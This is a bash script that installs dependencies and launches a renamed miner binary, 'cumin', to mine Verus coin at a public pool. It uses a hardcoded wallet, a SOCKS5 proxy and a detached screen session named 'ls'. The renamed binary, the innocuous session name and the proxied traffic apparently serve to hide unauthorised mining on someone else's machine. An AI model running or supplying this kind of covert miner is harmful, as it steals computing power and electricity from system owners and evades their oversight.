#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
PROXY=socks5://72.195.34.58:4145
./cumin -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
